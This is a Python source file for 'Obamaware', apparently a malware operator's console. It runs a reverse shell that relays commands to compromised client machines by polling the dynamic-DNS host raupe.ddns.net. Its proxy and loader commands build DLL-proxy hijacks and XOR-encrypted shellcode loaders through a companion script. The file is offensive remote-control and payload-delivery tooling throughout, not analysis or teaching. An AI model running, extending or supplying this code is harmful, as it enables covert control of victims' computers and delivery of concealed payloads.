import cmd
import os
import sys  
import requests
import threading
import time

ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"

url = "http://raupe.ddns.net/cdr"
body = "USER ### GET"


class Obamaware(cmd.Cmd):
    intro = '\033[32mWelcome to the Obamaware shell. \033[32mType help to list commands.\033[0m\n'
    prompt = 'Obamaware>'
    file = None
    def __init__(self):
        super().__init__()
        self.revshell = False
        self.revname = ""
        self.cd = False
        self.do_clear("")
        self.lastout = True
        self.inactivitycounter = 0
    
    def safe_print(self, text):
        sys.stdout.write("\r")                    # Return to start of line
        sys.stdout.write(" " * (len(self.prompt) + 80)) # Clear the line (arbitrary width)
        sys.stdout.write("\r")                    # Return to start again
        print(text+"\n")                               # Print the output
        sys.stdout.write(self.prompt)                  # Reprint the prompt
        sys.stdout.flush()
    
    def send_request_loop(self, name, stopped):
        while not stopped.is_set():
            if not self.revshell:
                self.stop.set()
                break
            try:
                resp = requests.post(url, data=body.replace("USER", name), timeout=3)
                response = resp.text.split(" ### ", 1)
                if "output" in response[0] and not self.lastout:
                    if len(response) > 1:
                        if "__NO_PAYLOAD__" not in response[1]:
                            self.inactivitycounter = 0
                            if self.cd:
                                self.cd = False
                                self.prompt = f'{Status} {resp.text.split(" ### ", 1)[1].strip()}>'
                                self.safe_print("")
                            else:
                                self.safe_print(f"{Success} {resp.text.split(' ### ', 1)[1].strip()}")
                            self.lastout = True
            except requests.RequestException as e:
                pass
            if self.inactivitycounter >= 5:
                self.inactivitycounter = 0
                self.do_EOF("")
                self.safe_print(f"{ErrorSign} No response from client. Reverse shell stopped.")
            elif self.lastout and "execute" in resp.text.split(" ### ", 1)[0]:
                self.inactivitycounter += 1
            time.sleep(3)

    def do_cd(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.cd = True
        if args:
            self.send_request("POST", self.revname, f"cd {args}\ncd").strip("\r\n")
        else:
            self.send_request("POST", self.revname, "cd")

    def send_request(self, mode, name, cmd=None):
        if mode == "GET":
            try:
                resp = requests.post(url, data=body.replace("USER", name), timeout=3)
                if resp:
                    self.prompt = f'Obamaware {name}>'
                else:
                    return
                if not self.revshell:
                    self.revshell = True
                    self.revname = name
                    print(f"{Status} Reverse shell started. Type 'exit' or 'EOF' to stop.")
                    print(f"{Status} Type <<EOT to beginn a multiline command and EOT to send it.")
                    print(f"{Status} Retrieving working directory...")
                    self.prompt = f'{ErrorSign} If nothing happens, the client might be offline...'
                    self.stop = threading.Event()
                    t = threading.Thread(target=self.send_request_loop, args=(name, self.stop))
                    t.start()
                self.do_cd("")  # Get initial directory
                return resp.text
            except requests.RequestException as e:
                print(f"{ErrorSign} request failed:", e)
        elif mode == "POST" and cmd:
            try:
                resp = requests.post(url, data=body.replace("USER", name).replace("GET", "execute ### " + cmd), timeout=10)
                self.lastout = False
                return resp.text
            except requests.RequestException as e:
                print("request failed:", e)
                return

    # ----- basic shell commands -----
    def multiline_command(self):
        command = ""
        line = ""
        while line.strip() != "EOT":
            line = input(">>")
            command += line + "\n"
        return command[:-4]
    def do_EOF(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_exit(self, line):
        self.revshell = False
        if self.prompt == 'Obamaware>':
            return True
        else:
            self.prompt = 'Obamaware>'

    def do_clear(self, line):
        os.system('cls' if os.name == 'nt' else 'clear')

    def do_proxy(self, line):
        print("")
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)
    
    def do_loader(self, line):
        print("")
        line = "null null " + line
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system('python DllProxyGenerator.py ' + args)

    def do_cmd(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        os.system(line)

    def do_revshell(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        self.send_request("GET", args)
    

    def do_help(self, line):
        print("\033[32mCommands:\033[0m")
        print("  \033[32mproxy\033[0m - Create a dll-proxy + optional ShellcodeLoader creation\n          \033[33m<dll_path> <output_exe_path> [<shellcode_path> <xor_key>] <cpp_script_path(output)>\n")
        print("  \033[32mshellCodeLoader\033[0m - Create a shellCodeLoader with XOR encrypted payload\n                    \033[33m<shellcode_path> <xor_key> <cpp_script_path(output)>\n")
        print("  \033[32mclear\033[0m - Clear the console")
        print("  \033[32mexit\033[0m - Exit the shell")
        print("  \033[32mhelp\033[0m - Show this help message")
        print("  \033[32mscmd\033[0m <command> - Execute a cmd command")
    
    def default(self, line):
        args = ' '.join([i.strip() for i in line.strip().split(' ') if i])
        if args == "EOT<<":
            args = self.multiline_command()
        if self.revshell:
            self.send_request("POST", self.revname, args)
        else:
            print(f"{ErrorSign} Unknown command: {line}. Type 'help' to list commands.")

if __name__ == '__main__':
    Obamaware().cmdloop()